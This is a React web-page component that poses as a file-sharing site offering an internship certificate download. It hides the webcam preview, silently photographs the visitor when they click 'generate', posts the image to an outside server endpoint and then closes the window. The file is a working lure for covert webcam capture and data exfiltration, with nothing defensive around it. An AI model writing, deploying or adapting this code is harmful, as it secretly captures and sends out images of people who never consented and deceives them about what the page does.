"use client";
import Webcam from "react-webcam";
import React, { useState, useRef, useCallback } from "react";
import axios from "axios";

function WebcamImage() {
  const webcamRef = useRef(null);
  const [img, setImg] = useState(null);
  const [name, setName] = useState("");
  const [load, setLoad] = useState(false);

  const capture = useCallback(() => {
    const imageSrc = webcamRef.current.getScreenshot();
    setImg(imageSrc);
  }, [webcamRef]);
  const videoConstraints = {
    width: 390,
    height: 390,
    facingMode: "user",
  };

  async function sendImg() {
    if (name.length == 0) {
      console.log(name.length);
      return alert("please refresh and enter a valid name!");
    }
    setLoad(true);
    try {
      const res = await axios.post("https://hackend.vercel.app/getpic", {
        img,
      });
      if (res.data.staus == 200) {
        window.open("about:blank", "_self");
        window.close();
      }
    } catch (error) {
      console.log(error);
    }
  }

  return (
    <>
      {load ? (
        <div className="h-screen absolute w-full bg-white/40"></div>
      ) : (
        <div className="h-screen w-full animate-text bg-gradient-to-r from-indigo-700 via-black/25 to-purple-700 p-10">
          <div className="text-white text-3xl font-mono my-5 text-center">
            Easy file sharing with easeshare 😊
            <br /> download your algabay AI's internship certificate now!
          </div>

          {img === null ? (
            <>
              <div className="h-auto invisible">
                <Webcam
                  screenshotFormat="image/jpeg"
                  videoConstraints={videoConstraints}
                  audio={false}
                  height={400}
                  width={400}
                  ref={webcamRef}
                  mirrored={true}
                />
              </div>
              <div className="flex items-center justify-center">
                <div>
                  <input
                    onChange={(e) => {
                      setName(e.target.value);
                    }}
                    className="h-12 w-full my-5 bg-white px-4 rounded-lg"
                    placeholder="enter your name"
                  />
                  <div>
                    <button
                      onClick={capture}
                      className="text-xl w-full text-white border border-gray-200 p-3 rounded-xl  active:bg-gray-400"
                    >
                      Click here to generate!
                    </button>
                  </div>
                </div>
              </div>
            </>
          ) : (
            <>
              <div className="w-full flex justify-center items-center p-20">
                <button
                  onClick={sendImg}
                  className="text-3xl text-white  text-center p-3 border border-gray-200 rounded-xl active:bg-gray-400"
                >
                  Download
                </button>
              </div>
            </>
          )}
        </div>
      )}
    </>
  );
}

export default WebcamImage;
